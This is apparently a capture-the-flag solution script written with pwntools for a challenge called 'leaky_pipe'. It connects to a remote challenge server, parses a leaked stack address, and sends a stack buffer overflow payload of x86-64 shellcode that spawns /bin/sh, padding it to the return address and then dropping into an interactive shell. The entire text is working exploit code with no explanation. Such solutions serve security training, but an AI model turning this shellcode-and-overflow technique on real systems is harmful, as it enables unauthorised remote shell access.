from pwn import *

elf = ELF("leaky_pipe")
offset = 0x28
r = remote("ctf.0xl4ugh.com", 4141)

r.recvuntil("here...  ")
leak = int(r.recvline().strip(), 16)
log.success("pointer leaked --> %s" % hex(leak))

payload = b""
payload += b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
payload += b'A' * (offset - len(payload))
payload += p64(leak)

r.send(payload)
r.interactive()
